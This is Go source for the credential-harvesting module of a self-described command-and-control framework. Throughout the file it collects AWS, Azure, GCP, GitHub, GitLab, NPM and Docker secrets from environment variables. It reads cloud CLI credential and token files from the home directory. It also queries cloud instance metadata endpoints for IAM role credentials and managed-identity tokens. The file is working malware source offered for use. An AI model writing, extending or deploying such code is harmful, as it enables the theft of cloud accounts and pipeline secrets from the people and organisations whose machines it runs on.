package harvest

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Cloud credential harvester — AWS, Azure, GCP.

	Cloud credentials are almost always either:
	  a) Environment variables set by CI/CD pipelines or developer workstations
	  b) Config files in well-known locations (~/.aws/credentials, etc.)
	  c) Instance metadata endpoints (169.254.169.254) when running in cloud VMs
	  d) Windows Credential Manager (for az login / aws configure tokens)

	This module tries all four sources and returns everything it finds.
*/

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// CloudCredential is one discovered cloud secret.
type CloudCredential struct {
	Provider string // "AWS", "Azure", "GCP"
	Source   string // "env", "file", "imds", "credmgr"
	Key      string // variable / field name
	Value    string // the secret value
	Profile  string // profile name if applicable
}

// HarvestCloudCredentials collects all discoverable cloud credentials.
func HarvestCloudCredentials() []CloudCredential {
	var creds []CloudCredential
	creds = append(creds, harvestEnv()...)
	creds = append(creds, harvestFiles()...)
	creds = append(creds, harvestIMDS()...)
	return creds
}

// ─── Environment Variables ───────────────────────────────────────────────────

var cloudEnvVars = map[string]string{
	// AWS
	"AWS_ACCESS_KEY_ID":          "AWS",
	"AWS_SECRET_ACCESS_KEY":      "AWS",
	"AWS_SESSION_TOKEN":          "AWS",
	"AWS_SECURITY_TOKEN":         "AWS",
	"AWS_DEFAULT_REGION":         "AWS",
	"AWS_PROFILE":                "AWS",
	// Azure
	"AZURE_CLIENT_ID":            "Azure",
	"AZURE_CLIENT_SECRET":        "Azure",
	"AZURE_TENANT_ID":            "Azure",
	"AZURE_SUBSCRIPTION_ID":      "Azure",
	"AZURE_CLIENT_CERTIFICATE_PATH": "Azure",
	// GCP
	"GOOGLE_APPLICATION_CREDENTIALS": "GCP",
	"GOOGLE_CLOUD_PROJECT":           "GCP",
	"GCLOUD_PROJECT":                 "GCP",
	"CLOUDSDK_CORE_PROJECT":          "GCP",
	// Generic
	"GITHUB_TOKEN":   "GitHub",
	"GITLAB_TOKEN":   "GitLab",
	"NPM_TOKEN":      "NPM",
	"DOCKER_PASSWORD":"Docker",
}

func harvestEnv() []CloudCredential {
	var results []CloudCredential
	for key, provider := range cloudEnvVars {
		if val := os.Getenv(key); val != "" {
			results = append(results, CloudCredential{
				Provider: provider,
				Source:   "env",
				Key:      key,
				Value:    val,
			})
		}
	}
	return results
}

// ─── Config Files ─────────────────────────────────────────────────────────────

func harvestFiles() []CloudCredential {
	var results []CloudCredential
	home, _ := os.UserHomeDir()

	// AWS credentials file.
	awsCreds := filepath.Join(home, ".aws", "credentials")
	if data, err := os.ReadFile(awsCreds); err == nil {
		results = append(results, parseINICredentials("AWS", "file:"+awsCreds, string(data))...)
	}

	// AWS config (may contain role ARNs and source_profile chains).
	awsConfig := filepath.Join(home, ".aws", "config")
	if data, err := os.ReadFile(awsConfig); err == nil {
		results = append(results, parseINICredentials("AWS", "file:"+awsConfig, string(data))...)
	}

	// Azure CLI token cache.
	azureTokens := filepath.Join(os.Getenv("USERPROFILE"), ".azure", "accessTokens.json")
	if data, err := os.ReadFile(azureTokens); err == nil {
		results = append(results, CloudCredential{
			Provider: "Azure",
			Source:   "file:" + azureTokens,
			Key:      "accessTokens.json",
			Value:    string(data),
		})
	}

	// GCP application default credentials.
	gcpADC := filepath.Join(os.Getenv("APPDATA"), `gcloud\application_default_credentials.json`)
	if data, err := os.ReadFile(gcpADC); err == nil {
		results = append(results, CloudCredential{
			Provider: "GCP",
			Source:   "file:" + gcpADC,
			Key:      "application_default_credentials",
			Value:    string(data),
		})
	}

	// GCP legacy credentials.
	gcpLegacy := filepath.Join(os.Getenv("APPDATA"), `gcloud\credentials.db`)
	if _, err := os.Stat(gcpLegacy); err == nil {
		results = append(results, CloudCredential{
			Provider: "GCP",
			Source:   "file",
			Key:      "credentials.db path",
			Value:    gcpLegacy,
		})
	}

	return results
}

func parseINICredentials(provider, source, content string) []CloudCredential {
	var results []CloudCredential
	var currentProfile string

	sensitiveKeys := map[string]bool{
		"aws_access_key_id":     true,
		"aws_secret_access_key": true,
		"aws_session_token":     true,
		"role_arn":              true,
		"source_profile":        true,
	}

	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			currentProfile = strings.Trim(line, "[]")
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		val := strings.TrimSpace(parts[1])
		if sensitiveKeys[strings.ToLower(key)] && val != "" {
			results = append(results, CloudCredential{
				Provider: provider,
				Source:   source,
				Key:      key,
				Value:    val,
				Profile:  currentProfile,
			})
		}
	}
	return results
}

// ─── Instance Metadata Service ───────────────────────────────────────────────

const imdsTimeout = 2 * time.Second

func harvestIMDS() []CloudCredential {
	var results []CloudCredential

	// AWS IMDSv1 (no auth required).
	if creds, err := awsIMDS(); err == nil {
		results = append(results, creds...)
	}

	// Azure IMDS.
	if creds, err := azureIMDS(); err == nil {
		results = append(results, creds...)
	}

	// GCP metadata server.
	if creds, err := gcpIMDS(); err == nil {
		results = append(results, creds...)
	}

	return results
}

func imdsGet(url string, headers map[string]string) ([]byte, error) {
	client := &http.Client{Timeout: imdsTimeout}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}

func awsIMDS() ([]CloudCredential, error) {
	// List IAM role names.
	roleData, err := imdsGet("http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("[cloud] AWS IMDS roles: %s", string(roleData))
	// {{end}}
	roles := strings.Split(strings.TrimSpace(string(roleData)), "\n")
	var creds []CloudCredential
	for _, role := range roles {
		role = strings.TrimSpace(role)
		if role == "" {
			continue
		}
		credsData, err := imdsGet(
			"http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role, nil)
		if err != nil {
			continue
		}
		creds = append(creds, CloudCredential{
			Provider: "AWS",
			Source:   "imds",
			Key:      "IAM-role:" + role,
			Value:    string(credsData),
		})
	}
	return creds, nil
}

func azureIMDS() ([]CloudCredential, error) {
	data, err := imdsGet(
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
		map[string]string{"Metadata": "true"},
	)
	if err != nil {
		return nil, err
	}
	var tok struct {
		AccessToken string `json:"access_token"`
		ClientID    string `json:"client_id"`
	}
	if err := json.Unmarshal(data, &tok); err != nil {
		return nil, err
	}
	if tok.AccessToken == "" {
		return nil, fmt.Errorf("no token")
	}
	return []CloudCredential{{
		Provider: "Azure",
		Source:   "imds",
		Key:      "managed_identity_token",
		Value:    tok.AccessToken,
	}}, nil
}

func gcpIMDS() ([]CloudCredential, error) {
	data, err := imdsGet(
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		map[string]string{"Metadata-Flavor": "Google"},
	)
	if err != nil {
		return nil, err
	}
	return []CloudCredential{{
		Provider: "GCP",
		Source:   "imds",
		Key:      "service_account_token",
		Value:    string(data),
	}}, nil
}
